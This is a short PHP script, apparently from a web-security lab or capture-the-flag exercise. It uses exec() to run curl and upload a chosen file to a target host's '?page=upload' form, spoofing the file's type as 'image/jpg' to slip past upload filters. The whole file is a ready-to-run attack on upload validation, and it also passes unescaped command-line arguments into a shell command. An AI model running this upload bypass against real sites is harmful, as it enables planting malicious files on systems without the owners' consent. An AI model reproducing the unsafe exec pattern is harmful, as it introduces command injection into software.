<?php
	$output=null;
	$retval=null;
	$e = exec("curl   -F uploaded=@\"$argv[1];type=image/jpg\"   -F Upload=Upload \"http://$argv[2]/?page=upload#\"", $output, $retval);
	var_dump($output);
?>
